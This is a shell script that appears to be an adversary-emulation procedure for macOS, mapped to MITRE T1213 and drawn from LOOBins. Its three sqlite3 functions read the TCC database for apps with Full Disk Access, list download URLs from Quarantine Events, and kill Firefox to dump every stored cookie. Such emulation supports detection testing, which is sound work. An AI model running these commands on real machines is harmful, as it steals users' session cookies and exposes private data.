#!/bin/sh
# POSIX-compliant
# Procedure Name: sqlite3
# Tactic: Collection
# Technique: T1213
# GUID: 5f2f74c2-1251-4ad5-9976-08c1ed29d868
# Intent: Query and manage sqlite databases. Sourced from LOOBins; confirm MITRE mapping for each enabled option.
...
TTP_ID="T1213" #replace with you coresponding ttp_id
...
GET_APPS_WITH_FULL_DISK_ACCESS=false
GET_FIREFOX_COOKIE_DATA=false
VIEW_URL_ASSOCIATED_WITH_FILE_DOWNLOADS=false
...
PROCEDURE_NAME="sqlite3"  # Set by build system from YAML procedure_name field
...
# We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
        --get-apps-with-full-disk-access)
            GET_APPS_WITH_FULL_DISK_ACCESS=true
            ;;
        --get-firefox-cookie-data)
            GET_FIREFOX_COOKIE_DATA=true
            ;;
        --view-url-associated-with-file-downloads)
            VIEW_URL_ASSOCIATED_WITH_FILE_DOWNLOADS=true
            ;;
            *)
...
SCRIPT:
  --get-apps-with-full-disk-access The following command interacts with the TCC (Transparency, Consent, and Control) database to show t
  --get-firefox-cookie-data        The following one-liner can be used to kill Firefox and dump cookie data from the user's Firefox pro
  --view-url-associated-with-file-downloads The following sqlite command is commonly used by macOS malware to view the URL in which the payload 
...
# Execute functions for --get-apps-with-full-disk-access
if [ "$GET_APPS_WITH_FULL_DISK_ACCESS" = true ]; then
    core_debug_print "Executing functions for --get-apps-with-full-disk-access"
    result=$(execute_function execute_get_apps_full_disk_access)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --get-firefox-cookie-data
if [ "$GET_FIREFOX_COOKIE_DATA" = true ]; then
    core_debug_print "Executing functions for --get-firefox-cookie-data"
    result=$(execute_function execute_get_firefox_cookie_data)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --view-url-associated-with-file-downloads
if [ "$VIEW_URL_ASSOCIATED_WITH_FILE_DOWNLOADS" = true ]; then
    core_debug_print "Executing functions for --view-url-associated-with-file-downloads"
    result=$(execute_function execute_view_url_associated_file_downloads)
    raw_output="${raw_output}${result}"
fi
...
# Function: execute_get_apps_full_disk_access
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_get_apps_full_disk_access() {
    local result
    result=$(sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
'select client from access where auth_value and service = "kTCCServiceSystemPolicyAllFiles"' 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_get_firefox_cookie_data
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_get_firefox_cookie_data() {
    local result
    result=$(killall firefox; find ~/Library/Application\ Support/Firefox/Profiles/. | grep cookies.sqlite | xargs -I {} sqlite3 {} "select * from moz_cookies" 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}

# Function: execute_view_url_associated_file_downloads
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

execute_view_url_associated_file_downloads() {
    local result
    result=$(sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent' 2>&1)
    $CMD_PRINTF "RESULT|%s\n" "$result"
    return 0
}
